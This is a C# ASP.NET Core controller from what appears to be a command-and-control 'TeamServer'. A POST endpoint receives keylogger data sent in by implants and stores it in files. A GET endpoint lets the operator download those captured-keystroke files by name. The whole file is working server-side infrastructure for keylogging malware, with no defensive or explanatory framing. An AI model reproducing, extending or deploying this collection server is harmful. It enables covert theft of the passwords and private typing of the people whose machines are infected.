using Microsoft.AspNetCore.Mvc;
using TeamServer.Interface;

namespace TeamServer.Controllers;

[ApiController]
[Route(Routes.Keylogger)]
public sealed class KeyloggerController : ControllerBase
{
    private readonly IKeyloggerService _keyloggerService;

    public KeyloggerController(IKeyloggerService keyloggerService)
    {
        _keyloggerService = keyloggerService;
    }

    [HttpPost("data")]
    public async Task<IActionResult> PostKeyloggerData([FromBody] KeyloggerData keyloggerData)
    {
        if (keyloggerData is null || keyloggerData.Data is null)
        {
            return BadRequest("Keylogger data is required");
        }

        var result = await _keyloggerService.SaveDataAsync(keyloggerData.Data);
        return result.IsSuccess ? Ok(new
        {
            message = "Keylogger data saved successfully",
            filename = result.Response
        }) : BadRequest(result.Error);
    }

    [HttpGet("download/{filename}")]
    public async Task<IActionResult> DownloadFile(string filename)
    {
        var result = await _keyloggerService.GetFileAsync(filename);

        return result.IsSuccess
            ? File(result.Response!, "application/octet-stream", Path.GetFileName(filename))
            : NotFound(result.Error);
    }
}

public sealed class KeyloggerData
{
    public string? Data { get; set; }
}
